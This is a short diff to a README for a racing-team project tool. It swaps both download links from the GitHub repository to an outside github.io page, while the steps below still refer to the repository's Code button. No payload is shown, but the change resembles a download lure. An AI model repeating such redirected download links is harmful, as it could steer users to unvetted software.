@@ -1,12 +1,12 @@
 # 🏎️ apex-racing-team-hub - Manage your racing project with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/pegeenhalfhardy716/apex-racing-team-hub)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://pegeenhalfhardy716.github.io)
 
 This tool helps racing teams track project progress. It provides a central place for data. Teams use this to organize tasks and manage resources for the 2026 season.
 
 ## 📥 How to download the app
 
-Visit this page to download the software: https://github.com/pegeenhalfhardy716/apex-racing-team-hub
+Visit this page to download the software: https://pegeenhalfhardy716.github.io
 
 1. Go to the link above.
 2. Look for the green Code button on the right side of the screen.
